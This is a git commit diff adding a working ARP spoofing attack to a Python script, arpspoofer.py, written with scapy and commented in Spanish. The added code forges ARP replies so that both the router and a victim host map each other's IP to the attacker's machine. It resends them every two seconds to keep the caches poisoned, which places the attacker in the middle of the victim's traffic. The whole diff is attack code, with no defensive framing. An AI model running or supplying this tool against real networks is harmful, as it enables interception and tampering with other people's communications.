252fb50db8f3f06955f76d3de56d28b06f83bc7a
Rodrigo <rodrigo.montoya.salva@gmail.com>
2020-06-13 19:10:54 -0400

    v2

--- arpspoofer.py
+++ arpspoofer.py
@@ -20,5 +20,23 @@ def get_mac_address(ip_address):
 target_mac= str(get_mac_address(target_ip))
 router_mac= str(get_mac_address(router_ip))
 
-print (router_mac)
-print (target_mac)
+
+# op=2 'Response' 
+def spoof(router_ip,target_ip,route_mac,target_mac):
+# El primer paquete que enviamos hace que el router crea que la victima le esta enviando un paquete
+    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip,psrc=target_ip)
+# El segundo paquete que enviamos le hace creer a la victima que el router le esta enviando un paquete
+    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip,psrc=router_ip)
+
+    scapy.send(packet1)
+    scapy.send(packet2)
+
+#Este loop lo unico que hace es enviar los paquetes cada 2 segundos para que cuando la tabla arp se refresque siga spoofeada
+
+try:
+    while True:
+        spoof(router_ip,target_ip,router_mac,target_mac)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('Closing ARP Spooder.')
+
